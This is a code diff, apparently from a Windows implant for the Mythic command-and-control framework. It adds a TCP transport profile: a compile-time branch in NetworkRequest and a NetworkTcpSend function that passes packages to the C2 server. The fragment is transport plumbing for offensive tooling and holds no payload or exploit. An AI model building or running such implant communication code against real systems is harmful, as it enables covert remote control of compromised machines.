@@ -59,6 +59,17 @@ BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T*
         return TRUE;
     #endif
 
+/* TCP C2 Profile */
+    #ifdef TCP_TRANSPORT
+        BOOL bStatus = FALSE; 
+        
+        bStatus = NetworkTcpSend(package, ppOutData, pOutLen, IsGetResponse);
+        
+        if (bStatus == FALSE || ppOutData == NULL || pOutLen == NULL)
+            return FALSE;
+
+        return TRUE;
+    #endif
 // Maybe some day
     #ifdef DNS_TRANSPORT
         return TRUE;
@@ -173,6 +184,29 @@ BOOL NetworkSmbSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen, BOOL Is
 
 #endif  // SMB_TRANSPORT
 
+#ifdef TCP_TRANSPORT
+/**
+ * @brief Transport Mythic using TCP profile.
+ * 
+ * @param[in] package Payload to send to Mythic server.
+ * @param[out] ppOutData Output buffer from response.
+ * @param[out] pOutLen Length of response output.
+ * 
+ * @return BOOL
+ */
+BOOL NetworkTcpSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen, BOOL IsGetResponse)
+{
+    BOOL bStatus = FALSE;
+
+    /* Create/Write data to TCP Comms Channel */
+    bStatus = TcpSend(package);
+    
+
+    return bStatus;
+}
+
+
+#endif  // TCP_TRANSPORT
 
 #ifdef DNS_TRANSPORT
     // good code
